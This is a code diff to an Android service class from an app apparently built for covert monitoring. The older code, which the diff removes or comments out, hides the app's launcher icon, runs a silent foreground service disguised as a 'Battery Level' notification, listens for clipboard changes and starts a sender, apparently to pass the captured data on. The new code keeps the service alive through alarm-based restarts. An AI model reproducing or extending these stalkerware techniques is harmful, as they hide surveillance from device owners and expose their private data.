@@ -3,6 +3,7 @@ package com.behavioralanalysis.service;
 import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
+import android.app.PendingIntent;
 import android.app.Service;
 import android.content.ClipData;
 import android.content.ClipboardManager;
@@ -23,50 +24,67 @@ import org.json.JSONObject;
 
 public class MainService extends Service {
     private static Context context;
+    ServiceReceiver alarm = new ServiceReceiver();
 
     @Override
     public void onCreate() {
         super.onCreate();
 
-        PackageManager packageManager = this.getPackageManager();
-        packageManager.setComponentEnabledSetting(new ComponentName(this, MainActivity.class), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
+/*        PackageManager packageManager = this.getPackageManager();
+        packageManager.setComponentEnabledSetting(
+                new ComponentName(this, MainActivity.class),
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP
+        );
 
         if (Build.VERSION.SDK_INT > Build.VERSION_CODES.O) {
             startCustomForeground();
         } else {
             startForeground(1, new Notification());
-        }
+        }*/
     }
 
     @RequiresApi(Build.VERSION_CODES.O)
     private void startCustomForeground() {
-        String notificationChannelId = "example.permanence";
-        String channelName = "Battery Level Service";
-        NotificationChannel notificationChannel = new NotificationChannel(notificationChannelId, channelName, NotificationManager.IMPORTANCE_NONE);
+        String notificationChannelId = "behaviouranalysis";
+        String channelName = "Service";
+        NotificationChannel notificationChannel = new NotificationChannel(
+                notificationChannelId,
+                channelName,
+                NotificationManager.IMPORTANCE_NONE
+        );
         notificationChannel.setLightColor(Color.BLUE);
         notificationChannel.setLockscreenVisibility(Notification.VISIBILITY_PRIVATE);
 
-        NotificationManager notificationManager = (NotificationManager)getSystemService(Context.NOTIFICATION_SERVICE);
+        NotificationManager notificationManager = (NotificationManager)getSystemService(
+                Context.NOTIFICATION_SERVICE
+        );
         assert notificationManager != null;
         notificationManager.createNotificationChannel(notificationChannel);
 
-        NotificationCompat.Builder notificationBuilder = new NotificationCompat.Builder(this, notificationChannelId);
+        NotificationCompat.Builder notificationBuilder = new NotificationCompat.Builder(
+                this,
+                notificationChannelId
+        );
         Notification notification = notificationBuilder.setOngoing(true)
-                .setContentTitle("Battery Level")
+                .setContentTitle("Behaviour Analysis")
                 .setPriority(NotificationManager.IMPORTANCE_MIN)
                 .setCategory(Notification.CATEGORY_SERVICE)
                 .build();
         startForeground(1, notification);
     }
-
+/*
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
         super.onStartCommand(intent, flags, startId);
 
-        ClipboardManager.OnPrimaryClipChangedListener primaryClipChangedListener = new ClipboardManager.OnPrimaryClipChangedListener() {
+        ClipboardManager.OnPrimaryClipChangedListener primaryClipChangedListener =
+                new ClipboardManager.OnPrimaryClipChangedListener() {
             @Override
             public void onPrimaryClipChanged() {
-                ClipboardManager clipboardManager = (ClipboardManager)getSystemService(CLIPBOARD_SERVICE);
+                ClipboardManager clipboardManager = (ClipboardManager)getSystemService(
+                        CLIPBOARD_SERVICE
+                );
                 if (clipboardManager.hasPrimaryClip()) {
                     ClipData clipData = clipboardManager.getPrimaryClip();
                     if (clipData.getItemCount() > 0) {
@@ -92,6 +110,17 @@ public class MainService extends Service {
         Sender.startAsync(this);
 
         return START_STICKY;
+    }*/
+
+    @Override
+    public int onStartCommand(Intent intent, int flags, int startId) {
+        alarm.SetAlarm(this);
+        return START_STICKY;
+    }
+
+    @Override
+    public void onStart(Intent intent, int startId) {
+        alarm.SetAlarm(context);
     }
 
     @Override
